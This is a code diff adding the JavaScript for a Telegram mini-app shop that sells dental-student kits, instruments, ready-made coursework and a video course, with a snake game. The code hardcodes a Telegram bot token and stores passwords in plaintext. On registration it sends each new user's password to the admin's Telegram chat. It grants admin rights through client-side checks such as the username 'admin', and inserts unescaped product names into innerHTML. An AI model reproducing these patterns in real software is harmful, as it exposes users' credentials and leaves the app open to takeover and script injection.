@@ -514,6 +514,675 @@
     const BOT_TOKEN = "8806561978:AAGrGi66DRF4-35ZHs76t_RrlViUmnoaiS0";
     const ADMIN_CHAT_ID = "8753317016";
 
-    const tg = window.Telegram?.WebApp;
-  .expand();
-    
+        const tg = window.Telegram?.WebApp;
+    if (tg) tg.expand();
+
+    let authMode = 'login';
+    let isAdminUser = false;
+
+    const defaultProducts = [
+      { id: '1', tab: 'kits', sub: 'therapy', img: 'INVOKA-9b0b51d7-51c0-4762-ab84-2d23ca4aa0e9-res-0.png', name: 'Терапевтический набор студента (базовый)', price: 4900, desc: 'Базовый терапевтический набор для фантомов и практики.' },
+      { id: '2', tab: 'kits', sub: 'endo', icon: '📍', name: 'Эндодонтический набор (файлы, плаггеры)', price: 3400, desc: 'Набор ручных K-файлов и плаггеров для каналов.' },
+      { id: '3', tab: 'kits', sub: 'surgery', icon: '🪡', name: 'Хирургический набор (щипцы, элеваторы)', price: 5800, desc: 'Анатомические щипцы и элеваторы для занятий.' },
+      { id: '4', tab: 'kits', sub: 'ozpt', icon: '🦷', name: 'Набор для фантомного курса ОЗПТ', price: 6200, desc: 'Инструменты и модели для зубопротезирования.' },
+      { id: '5', tab: 'instruments', icon: '⚡', name: 'Турбинный наконечник с LED', price: 3900, desc: 'Турбинный наконечник с яркой подсветкой.' },
+      { id: '6', tab: 'instruments', icon: '⚙️', name: 'Угловой наконечник 1:1', price: 2600, desc: 'Механический угловой наконечник.' },
+      { id: '7', tab: 'instruments', icon: '🛡️', name: 'Набор коффердама с клампами', price: 4200, desc: 'Пробойник, щипцы, рамка и набор клампов.' },
+      { id: '8', tab: 'clothes', icon: '🥼', name: 'Медицинский костюм (хлопок)', price: 2800, desc: 'Дышащий хлопковый костюм для клиники.' },
+      { id: '9', tab: 'clothes', icon: '👓', name: 'Защитные оптические очки', price: 850, desc: 'Прозрачные панорамные очки для защиты глаз.' },
+      { id: '10', tab: 'courseworks', icon: '📑', name: 'Курсовая: Пропедевтика / Материалы', price: 1500, desc: 'Качественная курсовая работа с ГОСТ-оформлением.' },
+      { id: '11', tab: 'courseworks', icon: '📑', name: 'Курсовая: Остеохондроз и эргономика', price: 1800, desc: 'Готовая работа по профилактике профзаболеваний.' },
+      { id: '12', tab: 'courses', icon: '🎓', name: 'Курс по препарированию полостей', price: 2500, desc: 'Видео-курс и разбор протоколов препарирования.' }
+    ];
+
+    let products = [...defaultProducts];
+    let currentTab = 'kits';
+    let currentSub = 'therapy';
+    let cart = {};
+
+    function setAuthMode(mode) {
+      authMode = mode;
+      document.getElementById('btn-mode-login').classList.toggle('active', mode === 'login');
+      document.getElementById('btn-mode-reg').classList.toggle('active', mode === 'reg');
+      document.getElementById('reg-course-group').style.display = (mode === 'reg') ? 'block' : 'none';
+      document.getElementById('auth-submit-btn').innerText = (mode === 'reg') ? 'Зарегистрироваться' : 'Войти в аккаунт';
+    }
+
+    async function getFullCloudData() {
+      if (!JSONBIN_ID) return { users: [], products: defaultProducts };
+      try {
+        const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}/latest`, {
+          headers: { "Content-Type": "application/json", "X-Master-Key": JSONBIN_API_KEY }
+        });
+        const json = await res.json();
+        let record = json.record;
+        if (Array.isArray(record)) {
+          record = { users: record, products: defaultProducts };
+          saveFullCloudData(record);
+        }
+        if (!record.products || !record.products.length) {
+          record.products = defaultProducts;
+          saveFullCloudData(record);
+        }
+        return record;
+      } catch (e) {
+        return { users: [], products: defaultProducts };
+      }
+    }
+
+    async function saveFullCloudData(data) {
+      if (!JSONBIN_ID) return false;
+      try {
+        const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}`, {
+          method: "PUT",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Bin-Versioning": "false",
+            "X-Master-Key": JSONBIN_API_KEY
+          },
+          body: JSON.stringify(data)
+        });
+        return res.ok;
+      } catch (e) {
+        return false;
+      }
+    }
+
+    async function fetchUsersFromCloud() {
+      const data = await getFullCloudData();
+      return Array.isArray(data.users) ? data.users : [];
+    }
+
+    async function saveUsersToCloud(users) {
+      const data = await getFullCloudData();
+      data.users = users;
+      return await saveFullCloudData(data);
+    }
+
+    function sendTgAlert(text) {
+      if (!BOT_TOKEN) return;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`).catch(e => console.log(e));
+    }
+
+    async function handleAuthSubmit() {
+      const usernameInput = document.getElementById('auth-username').value.trim();
+      const passwordInput = document.getElementById('auth-password').value.trim();
+      const courseInput = document.getElementById('auth-course').value;
+
+      if (!usernameInput || !passwordInput) {
+        alert("Заполните никнейм и пароль!");
+        return;
+      }
+
+      const submitBtn = document.getElementById('auth-submit-btn');
+      submitBtn.innerText = "Связь с базой...";
+      submitBtn.disabled = true;
+
+      const users = await fetchUsersFromCloud();
+      const cleanUsername = usernameInput.replace(/^@/, '').toLowerCase();
+
+      if (authMode === 'reg') {
+        const userExists = users.some(u => u.cleanUsername === cleanUsername);
+        if (userExists) {
+          alert("❌ Пользователь с таким никнеймом уже зарегистрирован!");
+          submitBtn.innerText = "Зарегистрироваться";
+          submitBtn.disabled = false;
+          return;
+        }
+
+        const newUser = {
+          username: usernameInput,
+          cleanUsername: cleanUsername,
+          password: passwordInput,
+          course: courseInput,
+          registeredAt: new Date().toLocaleDateString('ru-RU'),
+          orders: [],
+          isAdmin: (cleanUsername === "admin" || String(tg?.initDataUnsafe?.user?.id) === String(ADMIN_CHAT_ID))
+        };
+
+        users.push(newUser);
+        await saveUsersToCloud(users);
+        localStorage.setItem("active_student_user", JSON.stringify(newUser));
+        sendTgAlert(`👤 <b>Новая регистрация студента!</b>\n\n• <b>Ник:</b> @${cleanUsername}\n• <b>Курс:</b> ${courseInput}\n• <b>Пароль:</b> <code>${passwordInput}</code>`);
+        alert("✅ Регистрация прошла успешно!");
+      } else {
+        const user = users.find(u => u.cleanUsername === cleanUsername);
+        if (!user || user.password !== passwordInput) {
+          alert("❌ Неверный логин или пароль!");
+          submitBtn.innerText = "Войти в аккаунт";
+          submitBtn.disabled = false;
+          return;
+        }
+        if (!Array.isArray(user.orders)) user.orders = [];
+        localStorage.setItem("active_student_user", JSON.stringify(user));
+        alert(`✅ С возвращением, ${user.username}!`);
+      }
+
+      submitBtn.disabled = false;
+      checkProfile();
+      checkAdminAccess();
+    }
+
+    function checkProfile() {
+      const user = JSON.parse(localStorage.getItem("active_student_user"));
+      if (user) {
+        document.getElementById("auth-box").style.display = "none";
+        document.getElementById("profile-card").style.display = "block";
+        document.getElementById("prof-display-name").innerText = user.username.startsWith('@') ? user.username : `@${user.username}`;
+        document.getElementById("prof-display-course").innerText = `${user.course} курс`;
+        renderOrdersHistory(user.orders || []);
+      } else {
+        document.getElementById("auth-box").style.display = "block";
+        document.getElementById("profile-card").style.display = "none";
+        renderOrdersHistory([]);
+        setAuthMode('login');
+      }
+    }
+
+    function logoutProfile() {
+      localStorage.removeItem("active_student_user");
+      isAdminUser = false;
+      const admBtn = document.getElementById("nav-item-admin");
+      if (admBtn) admBtn.style.display = "none";
+      checkProfile();
+    }
+
+    function renderOrdersHistory(orders) {
+      const container = document.getElementById("orders-history");
+      if (!container) return;
+      if (!orders || orders.length === 0) {
+        container.innerHTML = "У вас пока нет активных заказов.";
+        return;
+      }
+      container.innerHTML = orders.map(o => `
+        <div style="border-bottom:1px solid var(--card-border); padding:8px 0;">
+          <div style="font-weight:700; color:var(--accent);">${o.id} • ${o.date}</div>
+          <div style="margin:3px 0;">${o.items}</div>
+          <div style="font-weight:600;">Сумма: ${o.total.toLocaleString('ru-RU')} ₽</div>
+        </div>
+      `).join("");
+    }
+
+    function renderCatalog() {
+      const container = document.getElementById("catalog-grid");
+      if (!container) return;
+      container.innerHTML = "";
+
+      const filtered = products.filter(p => {
+        if (p.tab !== currentTab) return false;
+        if (currentTab === 'kits' && p.sub !== currentSub) return false;
+        return true;
+      });
+
+      if (!filtered.length) {
+        container.innerHTML = `<div style="grid-column:1/-1; text-align:center; color:var(--hint); padding:30px 10px;">В этой категории пока нет товаров.</div>`;
+        return;
+      }
+
+      filtered.forEach(p => {
+        const count = cart[p.id] || 0;
+        const card = document.createElement("div");
+        card.className = "card";
+
+        card.onclick = (e) => {
+          if (e.target.tagName === 'BUTTON' || e.target.closest('.counter')) return;
+          openProductDetail(p.id);
+        };
+
+        card.innerHTML = `
+          <div class="card-img-box">
+            ${p.img 
+              ? `<img src="${encodeURI(p.img)}" alt="${p.name}" class="card-product-img">`
+              : `<span style="font-size:36px;">${p.icon || '📦'}</span>`
+            }
+          </div>
+          <div class="card-title">${p.name}</div>
+          <div class="card-price">${p.price.toLocaleString('ru-RU')} ₽</div>
+          ${count === 0 
+            ? `<button class="btn-buy" onclick="event.stopPropagation(); updateCart('${p.id}', 1)">В корзину</button>`
+            : `<div class="counter" onclick="event.stopPropagation()">
+                <button onclick="updateCart('${p.id}', -1)">−</button>
+                <span>${count}</span>
+                <button onclick="updateCart('${p.id}', 1)">+</button>
+               </div>`
+          }
+        `;
+        container.appendChild(card);
+      });
+
+      updateCartBar();
+    }
+
+    async function syncProductsFromCloud() {
+      try {
+        const data = await getFullCloudData();
+        if (data && Array.isArray(data.products) && data.products.length > 0) {
+          products = data.products;
+          renderCatalog();
+          renderAdminProducts();
+        }
+      } catch (err) {}
+    }
+
+    function switchMainTab(tab, el) {
+      currentTab = tab;
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      el.classList.add('active');
+      const sub = document.getElementById('kits-subtabs');
+      if (sub) sub.style.display = (tab === 'kits') ? 'flex' : 'none';
+      renderCatalog();
+    }
+
+    function switchSubTab(sub, el) {
+      currentSub = sub;
+      document.querySelectorAll('.sub-btn').forEach(b => b.classList.remove('active'));
+      el.classList.add('active');
+      renderCatalog();
+    }
+
+    function updateCart(id, delta) {
+      cart[id] = (cart[id] || 0) + delta;
+      if (cart[id] <= 0) delete cart[id];
+      renderCatalog();
+    }
+
+    function updateCartBar() {
+      let total = 0, count = 0;
+      for (let id in cart) {
+        const p = products.find(i => String(i.id) === String(id));
+        if (p) {
+          total += p.price * cart[id];
+          count += cart[id];
+        }
+      }
+      const bar = document.getElementById("cart-float");
+      if (!bar) return;
+      if (count > 0) {
+        bar.style.display = "flex";
+        document.getElementById("cart-count").innerText = `${count} шт.`;
+        document.getElementById("cart-total").innerText = `Оформить ${total.toLocaleString('ru-RU')} ₽ →`;
+      } else {
+        bar.style.display = "none";
+      }
+    }
+
+    function switchNav(page, el) {
+      document.querySelectorAll('.page-section').forEach(p => p.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+      const targetPage = document.getElementById(`page-${page}`);
+      if (targetPage) targetPage.classList.add('active');
+      if (el) el.classList.add('active');
+      if (page === 'snake') drawGame();
+    }
+
+    function openCheckout() {
+      let total = 0, summary = [];
+      for (let id in cart) {
+        const p = products.find(i => String(i.id) === String(id));
+        if (p) {
+          total += p.price * cart[id];
+          summary.push(`${p.name} × ${cart[id]}`);
+        }
+      }
+      document.getElementById("order-summary").innerHTML = `<b>Состав:</b><br>${summary.join("<br>")}<br><br><b>Итого:</b> ${total.toLocaleString('ru-RU')} ₽`;
+      document.getElementById("modal-order").classList.add("active");
+      setTimeout(() => document.getElementById("order-comment")?.focus(), 100);
+    }
+
+    function closeCheckout() {
+      document.getElementById("modal-order").classList.remove("active");
+    }
+
+    async function sendOrder() {
+      const activeUser = JSON.parse(localStorage.getItem("active_student_user"));
+      if (!activeUser) {
+        alert("Пожалуйста, войдите в профиль перед оформлением!");
+        closeCheckout();
+        switchNav('profile', document.querySelectorAll('.nav-item')[1]);
+        return;
+      }
+
+      let total = 0, itemsList = [];
+      for (let id in cart) {
+        const p = products.find(i => String(i.id) === String(id));
+        if (p) {
+          total += p.price * cart[id];
+          itemsList.push(`${p.name} (x${cart[id]})`);
+        }
+      }
+
+      const orderBtn = document.getElementById('order-submit-btn');
+      orderBtn.innerText = "Оформление...";
+      orderBtn.disabled = true;
+
+      const comment = document.getElementById("order-comment").value.trim();
+      const orderId = "ORD-" + Math.floor(1000 + Math.random() * 9000);
+
+      const newOrderData = {
+        id: orderId,
+        items: itemsList.join(", ") + (comment ? ` [${comment}]` : ""),
+        total: total,
+        date: new Date().toLocaleDateString('ru-RU')
+      };
+
+      try {
+        const cloudData = await getFullCloudData();
+        const userIndex = (cloudData.users || []).findIndex(u => u.cleanUsername === activeUser.cleanUsername);
+        if (userIndex !== -1) {
+          if (!Array.isArray(cloudData.users[userIndex].orders)) cloudData.users[userIndex].orders = [];
+          cloudData.users[userIndex].orders.unshift(newOrderData);
+          await saveFullCloudData(cloudData);
+        }
+      } catch (err) {}
+
+      if (!Array.isArray(activeUser.orders)) activeUser.orders = [];
+      activeUser.orders.unshift(newOrderData);
+      localStorage.setItem("active_student_user", JSON.stringify(activeUser));
+
+      const tgUser = tg?.initDataUnsafe?.user;
+      const userLink = tgUser?.username ? `@${tgUser.username}` : `@${activeUser.cleanUsername}`;
+
+      const msg = `🛍️ <b>НОВЫЙ ЗАКАЗ: ${orderId}</b>\n\n` +
+                  `👤 <b>Студент:</b> ${activeUser.username} (${activeUser.course} курс)\n` +
+                  `📱 <b>Контакт:</b> ${userLink}\n` +
+                  `📦 <b>Состав:</b>\n• ${itemsList.join("\n• ")}\n\n` +
+                  `💰 <b>Сумма:</b> ${total.toLocaleString('ru-RU')} ₽\n` +
+                  (comment ? `📍 <b>Инфо:</b> ${comment}` : "");
+      sendTgAlert(msg);
+
+      cart = {};
+      orderBtn.innerText = "Подтвердить заказ";
+      orderBtn.disabled = false;
+      closeCheckout();
+      renderCatalog();
+      checkProfile();
+      alert(`✅ Заказ ${orderId} успешно оформлен! Куратор свяжется с вами.`);
+    }
+
+    function openProductDetail(productId) {
+      const p = products.find(i => String(i.id) === String(productId));
+      if (!p) return;
+
+      const imgBox = document.getElementById("pd-img-box");
+      if (p.img) {
+        imgBox.innerHTML = `<img src="${encodeURI(p.img)}" alt="${p.name}">`;
+      } else {
+        imgBox.innerHTML = `<div style="width:100%; aspect-ratio:1/1; display:flex; align-items:center; justify-content:center; font-size:64px; background:rgba(0,0,0,0.3); border-radius:16px; margin-bottom:14px;">${p.icon || '📦'}</div>`;
+      }
+
+      document.getElementById("pd-title").innerText = p.name;
+      document.getElementById("pd-price").innerText = `${p.price.toLocaleString('ru-RU')} ₽`;
+      document.getElementById("pd-desc").innerText = p.desc || "Описание товара уточняется у куратора.";
+
+      const btnBox = document.getElementById("pd-action-btn-box");
+      const count = cart[p.id] || 0;
+      
+      btnBox.innerHTML = count === 0
+        ? `<button class="btn-buy" style="padding:14px; font-size:15px;" onclick="updateCart('${p.id}', 1); openProductDetail('${p.id}');">Добавить в корзину</button>`
+        : `<div class="counter" style="padding:8px 12px; font-size:16px;">
+            <button style="width:36px; height:36px; font-size:18px;" onclick="updateCart('${p.id}', -1); openProductDetail('${p.id}');">−</button>
+            <span style="font-size:16px;">В корзине: ${count} шт.</span>
+            <button style="width:36px; height:36px; font-size:18px;" onclick="updateCart('${p.id}', 1); openProductDetail('${p.id}');">+</button>
+           </div>`;
+
+      document.getElementById("modal-product-detail").classList.add("active");
+    }
+
+    function closeProductDetail() {
+      document.getElementById("modal-product-detail").classList.remove("active");
+    }
+
+    function checkAdminAccess() {
+      const tgUserId = String(tg?.initDataUnsafe?.user?.id || "");
+      const activeUser = JSON.parse(localStorage.getItem("active_student_user") || "{}");
+      if (tgUserId === String(ADMIN_CHAT_ID) || activeUser.isAdmin === true || activeUser.cleanUsername === "admin") {
+        isAdminUser = true;
+        const btn = document.getElementById("nav-item-admin");
+        if (btn) btn.style.display = "flex";
+      }
+    }
+
+    function toggleAdmSub() {
+      const tab = document.getElementById("adm-tab").value;
+      const subGroup = document.getElementById("adm-sub-group");
+      if (subGroup) subGroup.style.display = (tab === 'kits') ? 'block' : 'none';
+    }
+
+    async function saveNewProduct() {
+      if (!isAdminUser) {
+        alert("У вас нет прав администратора!");
+        return;
+      }
+
+      const name = document.getElementById("adm-name").value.trim();
+      const tab = document.getElementById("adm-tab").value;
+      const sub = document.getElementById("adm-sub").value;
+      const price = parseInt(document.getElementById("adm-price").value, 10);
+      const img = document.getElementById("adm-img").value.trim();
+      const icon = document.getElementById("adm-icon").value.trim();
+      const desc = document.getElementById("adm-desc").value.trim();
+
+      if (!name || isNaN(price) || price <= 0) {
+        alert("Укажите корректное название и цену товара!");
+        return;
+      }
+
+      const btn = document.getElementById("adm-save-btn");
+      btn.innerText = "Сохранение...";
+      btn.disabled = true;
+
+      const newProd = {
+        id: String(Date.now()),
+        tab: tab,
+        sub: (tab === 'kits') ? sub : undefined,
+        name: name,
+        price: price,
+        img: img || undefined,
+        icon: (!img && icon) ? icon : (img ? undefined : '📦'),
+        desc: desc || "Описание скоро появится."
+      };
+
+      products.unshift(newProd);
+      renderCatalog();
+      renderAdminProducts();
+
+      const cloudData = await getFullCloudData();
+      cloudData.products = products;
+      const ok = await saveFullCloudData(cloudData);
+
+      if (ok) {
+        alert("✅ Товар успешно добавлен!");
+        document.getElementById("adm-name").value = "";
+        document.getElementById("adm-price").value = "";
+                document.getElementById("adm-img").value = "";
+        document.getElementById("adm-icon").value = "";
+        document.getElementById("adm-desc").value = "";
+      }
+
+      btn.innerText = "Опубликовать товар";
+      btn.disabled = false;
+    }
+
+    async function deleteProduct(rawId) {
+      if (!confirm("Вы точно хотите удалить этот товар из магазина?")) return;
+
+      const targetId = String(rawId).trim();
+      const prevLength = products.length;
+
+      for (let i = products.length - 1; i >= 0; i--) {
+        if (String(products[i].id).trim() === targetId) {
+          products.splice(i, 1);
+        }
+      }
+
+      if (products.length === prevLength) {
+        alert("Ошибка: товар не найден в списке.");
+        return;
+      }
+
+      if (cart[targetId]) {
+        delete cart[targetId];
+        updateCartBar();
+      }
+
+      renderAdminProducts();
+      renderCatalog();
+
+      try {
+        const cloudData = await getFullCloudData();
+        cloudData.products = products;
+        await saveFullCloudData(cloudData);
+      } catch (err) {}
+    }
+
+    function renderAdminProducts() {
+      const container = document.getElementById("adm-prod-list");
+      const countEl = document.getElementById("adm-prod-count");
+      if (!container) return;
+      if (countEl) countEl.innerText = products.length;
+
+      if (!products.length) {
+        container.innerHTML = `<div style="text-align:center; color:var(--hint); font-size:12px; padding:12px;">В каталоге нет товаров</div>`;
+        return;
+      }
+
+      container.innerHTML = products.map(p => `
+        <div style="display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.2); padding:10px; border-radius:10px; margin-bottom:6px;">
+          <div style="max-width: 65%;">
+            <div style="font-weight:700; font-size:13px; color:#fff; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${p.name}</div>
+            <div style="font-size:11px; color:var(--hint);">${p.price.toLocaleString('ru-RU')} ₽ • ${p.tab}</div>
+          </div>
+          <button type="button" onclick="deleteProduct('${String(p.id)}')" style="background:var(--danger); border:none; color:#fff; border-radius:6px; padding:6px 12px; font-size:11px; font-weight:700; cursor:pointer;">
+            Удалить
+          </button>
+        </div>
+      `).join("");
+    }
+
+    // --- ЗМЕЙКА ---
+    const canvas = document.getElementById("snake-canvas");
+    const ctx = canvas ? canvas.getContext("2d") : null;
+    const gridSize = 20;
+    const tileCount = 15;
+
+    let snake = [];
+    let food = { x: 5, y: 5 };
+    let dx = 1, dy = 0;
+    let nextDx = 1, nextDy = 0;
+    let snakeScore = 0;
+    let snakeBest = localStorage.getItem("snake_dent_best") || 0;
+    let snakeGameInterval = null;
+    let isSnakeRunning = false;
+
+    const bestEl = document.getElementById("snake-best");
+    if (bestEl) bestEl.innerText = snakeBest;
+
+    function startSnakeGame() {
+      snake = [
+        { x: 5, y: 7 },
+        { x: 4, y: 7 },
+        { x: 3, y: 7 }
+      ];
+      dx = 1; dy = 0;
+      nextDx = 1; nextDy = 0;
+      snakeScore = 0;
+      document.getElementById("snake-score").innerText = snakeScore;
+      document.getElementById("snake-overlay").style.display = "none";
+      document.getElementById("snake-promo-box").style.display = "none";
+
+      spawnTooth();
+      isSnakeRunning = true;
+      if (snakeGameInterval) clearInterval(snakeGameInterval);
+      snakeGameInterval = setInterval(gameLoop, 140);
+    }
+
+    function spawnTooth() {
+      let valid = false;
+      while (!valid) {
+        food.x = Math.floor(Math.random() * tileCount);
+        food.y = Math.floor(Math.random() * tileCount);
+        valid = !snake.some(segment => segment.x === food.x && segment.y === food.y);
+      }
+    }
+
+    function changeSnakeDir(dir) {
+      if (!isSnakeRunning) return;
+      if (dir === 'UP' && dy === 0) { nextDx = 0; nextDy = -1; }
+      if (dir === 'DOWN' && dy === 0) { nextDx = 0; nextDy = 1; }
+      if (dir === 'LEFT' && dx === 0) { nextDx = -1; nextDy = 0; }
+      if (dir === 'RIGHT' && dx === 0) { nextDx = 1; nextDy = 0; }
+    }
+
+    window.addEventListener("keydown", (e) => {
+      if (["ArrowUp", "KeyW"].includes(e.code)) changeSnakeDir('UP');
+      if (["ArrowDown", "KeyS"].includes(e.code)) changeSnakeDir('DOWN');
+      if (["ArrowLeft", "KeyA"].includes(e.code)) changeSnakeDir('LEFT');
+      if (["ArrowRight", "KeyD"].includes(e.code)) changeSnakeDir('RIGHT');
+    });
+
+    function gameLoop() {
+      dx = nextDx;
+      dy = nextDy;
+      const head = { x: snake[0].x + dx, y: snake[0].y + dy };
+
+      if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) return gameOverSnake();
+      if (snake.some(seg => seg.x === head.x && seg.y === head.y)) return gameOverSnake();
+
+      snake.unshift(head);
+
+      if (head.x === food.x && head.y === food.y) {
+        snakeScore++;
+        document.getElementById("snake-score").innerText = snakeScore;
+        if (window.Telegram?.WebApp?.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+
+        if (snakeScore > snakeBest) {
+          snakeBest = snakeScore;
+          localStorage.setItem("snake_dent_best", snakeBest);
+          const bestSpan = document.getElementById("snake-best");
+          if (bestSpan) bestSpan.innerText = snakeBest;
+        }
+        spawnTooth();
+      } else {
+        snake.pop();
+      }
+      drawGame();
+    }
+
+    function drawGame() {
+      if (!ctx) return;
+      ctx.fillStyle = "#0c152e";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.font = "16px serif";
+      ctx.textAlign = "center";
+      ctx.textBaseline = "middle";
+      ctx.fillText("🦷", food.x * gridSize + gridSize / 2, food.y * gridSize + gridSize / 2);
+
+      snake.forEach((seg, i) => {
+        ctx.fillStyle = (i === 0) ? "#38bdf8" : "rgba(56, 189, 248, 0.65)";
+        ctx.beginPath();
+        ctx.roundRect(seg.x * gridSize + 1, seg.y * gridSize + 1, gridSize - 2, gridSize - 2, 5);
+        ctx.fill();
+      });
+    }
+
+    function gameOverSnake() {
+      clearInterval(snakeGameInterval);
+      isSnakeRunning = false;
+      if (window.Telegram?.WebApp?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+
+      const overlay = document.getElementById("snake-overlay");
+      document.getElementById("snake-over-title").innerText = "Игра окончена!";
+      document.getElementById("snake-over-desc").innerText = `Ты собрал ${snakeScore} зубов.`;
+      document.getElementById("snake-promo-box").style.display = (snakeScore >= 5) ? "block" : "none";
+      overlay.style.display = "flex";
+    }
+
+    // Запуск приложения
+    checkProfile();
+    checkAdminAccess();
+    renderCatalog();
+    renderAdminProducts();
+    syncProductsFromCloud();
+  </script>
+</body>
+</html>
